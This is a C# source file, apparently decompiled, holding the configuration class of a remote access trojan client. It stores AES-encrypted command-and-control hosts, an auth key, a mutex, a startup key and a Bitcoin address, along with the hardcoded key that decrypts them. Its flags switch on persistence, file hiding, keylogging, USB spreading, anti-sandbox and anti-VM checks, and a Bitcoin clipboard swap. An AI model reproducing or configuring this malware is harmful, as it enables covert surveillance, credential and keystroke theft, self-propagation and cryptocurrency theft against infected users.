using System;
using xClient.Core.Cryptography;
using xClient.Core.Helper;

namespace xClient.Config;

public static class Settings
{
	public static string VERSION = "K3suZ8bNeV7x2qezLfmtGtkNRrbYU63+r5EdJkbpcdpiG73OoGcQeiUwjPgL2YQ9q6wHQs8mvMyZDMTQPQHjJA==";

	public static string HOSTS = "5xGFUGWggi6ildHYFnL66XiG2K5Jrk6SLEnzEzf63n/4akBSWBbEAf9Zb8dpuqaib2cL+ObQ5xmTGecpt9nafddJZ0KDbg4A2v4cNdORKIX+UdGiK5WOs1zl3oITpogGcb745pPmxaUr5P6ArrQafPZ+1jehDR1/qE9LqqLgmB9nz37UShRM5K3TxnL1C3xyQimivHJIb+rmM0hTDM9Axw==";

	public static int RECONNECTDELAY = 3000;

	public static string KEY = "1WvgEMPjdwfqIMeM9MclyQ==";

	public static string AUTHKEY = "NcFtjbDOcsw7Evd3coMC0y4koy/SRZGydhNmno81ZOWOvdfg7sv0Cj5ad2ROUfX4QMscAIjYJdjrrs41+qcQwg==";

	public static Environment.SpecialFolder SPECIALFOLDER = Environment.SpecialFolder.ApplicationData;

	public static string DIRECTORY = Environment.GetFolderPath(SPECIALFOLDER);

	public static string SUBDIRECTORY = "omhrfG82FUbJV9+IoWEAW8/kq5/tpaG6LtMjN3NDB47Vilr6QU0JfrkR/vWBCzcZ0/o2W/XB9WszTbDcJrrYtw==";

	public static string INSTALLNAME = "3i19Jy3PKscdiDs/ElsJw3rrA8dxE+nAbqw6JVg4eglHX1o3MWp/6GrAUQhOWryluoAZlhhaYyTR29OKFxL+tCKGqsS+S5utiHOPrB50dLk=";

	public static bool INSTALL = true;

	public static bool STARTUP = true;

	public static string MUTEX = "2ihVNbhymPK805ZORlgibGpz5ElPJJbSFrIhIWlez6+B/aoRG8O1XEuMv00drQuh0UooLahBNonhtkG07fScm+/zAmN5tQKfnKfoohNJGVg=";

	public static string STARTUPKEY = "SIJNrKMRwa5lgDzdnSkGy1Rjifskj9eUar7zJ0s11rbM2YiHMckeKY3Ty6lulqT97JaU8oYWnebyDIRzEpgQTQ==";

	public static bool HIDEFILE = true;

	public static bool ENABLELOGGER = true;

	public static string ENCRYPTIONKEY = "rUOBJSTV9sE3TQL69Hpd";

	public static string TAG = "fTuzIuu1yduIZDr01va0rBnoCOW+cjzFZpFPXOfzAI2Dkn0ymRjZ5qmDLVSaJApoHcbBlS+bEDXIGK+lDyyrGw==";

	public static string LOGDIRECTORYNAME = "kNdZVXLYUlVhTokQ/uHnAzTX1BXkx9IaGr7xaFNERM3IPCV6G/uGMX3s5lEvE0AHoBQBEc4JGcQ3rnTfDH3RoA==";

	public static string USBSpreadNAME = "C9XRQAjb4v30EPEJAO5tYOso9CruGPQnkpjDxv4LwOD/OCtq6AwssxOoo+OkkuZreRTViEhOBMr3F54mWUSY/MBA6i+lJHSjZlXlrCHcFNw=";

	public static string BTCAddress = "D3d0gLZNA4b0E5iUZyMbCV8QpHXZZUmtIfoRCCym243kZDjeUR3QbuR0pVz3gmBe3jRX90u8mcm/ebq5sBXyVw==";

	public static bool HIDELOGDIRECTORY = false;

	public static bool HIDEINSTALLSUBDIRECTORY = false;

	public static bool ENABLEPERSISTENCE = true;

	public static bool ENABLEANTISANDBOXIE = true;

	public static bool ENABLEANTIVM = true;

	public static bool ENABLEUSBSPREAD = true;

	public static bool ANTIDEBUG = false;

	public static bool STARTUPPERSISTENCE = true;

	public static bool ENABLEBTCSWAP = false;

	public static bool Initialize()
	{
		if (string.IsNullOrEmpty(VERSION))
		{
			return false;
		}
		AES.SetDefaultKey(ENCRYPTIONKEY);
		TAG = AES.Decrypt(TAG);
		VERSION = AES.Decrypt(VERSION);
		HOSTS = AES.Decrypt(HOSTS);
		SUBDIRECTORY = AES.Decrypt(SUBDIRECTORY);
		INSTALLNAME = AES.Decrypt(INSTALLNAME);
		MUTEX = AES.Decrypt(MUTEX);
		STARTUPKEY = AES.Decrypt(STARTUPKEY);
		LOGDIRECTORYNAME = AES.Decrypt(LOGDIRECTORYNAME);
		USBSpreadNAME = AES.Decrypt(USBSpreadNAME);
		BTCAddress = AES.Decrypt(BTCAddress);
		FixDirectory();
		return true;
	}

	private static void FixDirectory()
	{
		if (!PlatformHelper.Is64Bit)
		{
			switch (SPECIALFOLDER)
			{
			case Environment.SpecialFolder.ProgramFilesX86:
				SPECIALFOLDER = Environment.SpecialFolder.ProgramFiles;
				break;
			case Environment.SpecialFolder.SystemX86:
				SPECIALFOLDER = Environment.SpecialFolder.System;
				break;
			}
			DIRECTORY = Environment.GetFolderPath(SPECIALFOLDER);
		}
	}
}
